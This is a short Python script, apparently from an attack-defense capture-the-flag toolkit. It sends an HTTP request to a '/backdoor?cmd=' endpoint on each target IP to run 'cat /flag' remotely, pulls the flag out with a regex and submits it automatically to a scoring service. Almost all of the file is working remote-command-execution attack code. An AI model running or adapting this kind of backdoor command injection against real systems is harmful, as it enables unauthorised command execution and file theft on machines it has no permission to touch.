from web import WebPayload, WebStep

flag_submitter = WebStep(
    # $IP, $FLAG
    """
    POST /submit_flag HTTP/1.1
    Host: 127.0.0.1:8080
    User-Agent: CustomAgent
    Accept: */*
    Connection: keep-alive
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 12

    flag=$FLAG&ip=$IP
""",
    need_context=["$IP", "$FLAG"],
    post_extract={"$?": r"(.*)"},
)

web1 = [
    WebPayload(
        [
            WebStep(
                """
                    GET /backdoor?cmd=cat%20%2Fflag HTTP/1.1
                    Host: $IP:8081
                    User-Agent: CustomAgent
                    Accept: */*
                    Connection: keep-alive

                    """,
                need_context=["$IP"],
                post_extract={"$FLAG": r"flag{.*?}"},
            ),
            flag_submitter,
        ],
    )
]

if __name__ == "__main__":

    def run(ip):
        # for wp in web1 + web2 + web3 + ...:
        for wp in web1:
            try:
                wp.exploit({"$IP": ip}).check()
            except Exception as e:
                print(e)

    list(map(run, ["127.0.0.1"]))
